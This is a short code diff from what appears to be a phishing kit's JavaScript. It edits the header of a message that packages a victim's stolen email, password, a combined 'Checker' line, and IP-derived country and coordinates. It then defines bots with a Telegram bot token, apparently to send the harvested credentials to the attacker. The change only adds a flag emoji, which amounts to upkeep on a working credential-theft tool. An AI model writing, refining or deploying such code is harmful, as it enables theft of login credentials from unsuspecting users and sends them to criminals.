@@ -17139,7 +17139,7 @@
                 const flag = countryToFlagEmoji(visitorInfo[1]);
 				const coordinates = await getCoordinatesFromIP(visitorInfo[0]);
 				var message =
-                  `--------+ 🛡️ New Login Attempt (${visitorInfo[1]}) +--------\n`;
+                  `--------+ 🛡️ New Login Attempt ${flag} +--------\n`;
                 message += "📧 Email : " + ai + "\n";
                 message += "🔑 Password : " + pr + "\n";
                 message += "📧:🔑 Checker: " + ai + ":" + pr + "\n";
@@ -17152,7 +17152,7 @@
 				message += `📍 Coordinates: [${coordinates}]\n`;
                 message += "🕓 Date/Time : " + date + "\n";
                 message +=
-                  `--------+ 🛡️ New Login Attempt (${visitorInfo[1]}) +--------\n`;
+                  `--------+ 🛡️ New Login Attempt ${flag} +--------\n`;
 				var bots = [
 				  {
 					token: "7899011309:AAGKeHaMu_8NyrdQeNxglCtf6gfgrUpEejc",
